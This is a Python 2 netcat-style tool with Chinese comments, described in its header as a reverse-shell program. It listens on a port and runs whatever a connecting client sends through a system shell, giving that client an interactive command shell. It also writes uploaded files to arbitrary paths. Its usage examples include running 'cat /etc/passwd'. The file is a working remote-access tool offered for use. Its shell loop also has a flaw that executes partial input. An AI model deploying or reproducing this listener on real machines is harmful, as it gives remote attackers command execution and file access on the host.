#coding:utf-8

#---------------------------------------
#   程序：netcat.py
#   作者：vforbox
#   日期：2015-12-24
#   语言：Python 2.7
#   操作：预览帮助信息 ./netcat.py -h
#   功能：反弹shell
#---------------------------------------

# 导入所需要的Python库#
import sys
import socket
import getopt
import threading
import subprocess

# 定义一些全局变量#
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

# 确定是一个Python版本2#
if sys.version_info.major > 2:
    raw_input = input

# 使用方法
def usage():
    print "**********| Nc Net Tool |**********\n"
    print "Usage: nc.py -t target_host -p port"
    print "-l\t--listen\t\t- listen on[host]:[port] for incoming connections"
    print "-e\t--execute=file_to_run\t\t- execute the given file upon receiving a connection"
    print "-c\t--command\t\t- initialize a command shell"
    print "-u\t--upload=destination\t\t- upon receiving connection upload a file and write to [destination]"
    print "\n"
    print "Examples:"
    print "nc.py -t 192.168.100.20 -p 8888 -l -c"
    print "nc.py -t 192.168.100.20 -p 8888 -l -u=F:\\filename.txt"
    print "nc.py -t 192.168.100.20 -p 8888 -l -e=\"cat /etc/passwd\""
    print "echo 'xxxx' | ./nc.py -t www.google.com.hk -p 80"
    sys.exit(0)

# 定义主要的函数来处理命令行参数和调用其他函数
def main():
    global listen
    global command
    global upload
    global execute
    global target
    global upload_destination
    global port
    if not len(sys.argv[1:]):
        usage()

    # 命令行参数
    try:
        opts,args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError,e:
        print str(e)
        usage()
    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-c","--commandshell"):
            command = True
        elif o in ("-u","--upload"):
            upload_destination = a
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option" # or print "Unhandled Option"
    # 进行监听还是仅从标准输入发送数据
    if not listen and len(target) and port > 0:
        # 从命令行读取内存数据#
        # 这里将堵塞，所以不在向标准输入发送数据时发送 CTRL + D
        _buffer = sys.stdin.read()
        # 发送数据#
        client_sender(_buffer)
    # 开始监听并上传文件、执行命令
    # 放置一个反弹shell
    # 取决于上面的命令行选项
    #如果listen为true则建立一个监听的套接字，准备下一步的命令
    if listen:
        sever_loop()

#客户端发送数据
def client_sender(_buffer):
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        #连接都目标主机
        client.connect((target,port))
        if len(_buffer):
            client.send(_buffer)
        while True:
            #等待数据回传
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len < 4096:
                    break
            print response

            #等待更多的输入
            _buffer = raw_input("[YingLing@vforbox ~]# ")
            _buffer += "\n"
            #发送出去
            client.send(_buffer)
    except Exception as e:
        print e
        print "[*] Excepton! Exiting."

        #关闭连接
        client.close()

#服务监听#
def sever_loop():
    global target
    #如果没有定义目标，那么就监听所有接口
    if not len(target):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    print "[*]listen server [{}:{}]!".format(target,port)
    while True:
        client_socket,addr = server.accept()
        #分拆一个线程处理新的客户端
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()

#运行命令#
def run_command(command):
    #换行
    command = command.rstrip()
    #运行命令并将输出返回
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output = "Failed to execute command.\r\n"
    #将输出发送
    return output

#上传文件#
def client_handler(client_socket):
    global upload
    global execute
    global command
    #检测上传文件
    if len(upload_destination):
        #读取所有的字符并写下目标
        file_buffer = ""
        #持续读取数据直到没有符合的数据
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        #接收这些数据并将他们写出来
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            #确认文件已经写出来
            client_socket.send("Successfully saved file to %s\r\n"% upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n"%upload_destination)
    #检查命令执行
    if len(execute):
        #运行命令
        output = run_command(execute)
        client_socket.send(output)
    #如果需要一个命令行shell，那么进入另一个循环
    if command:
        while True:
            #跳出一个窗口
            client_socket.send("[YangLing@vforbox ~]#  ")
            #现在接收文件直到发现换行符(enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
                #返回命令输出
                response = run_command(cmd_buffer)
                #返回响应数据
                client_socket.send(response)
                
if __name__ == "__main__":
    main()
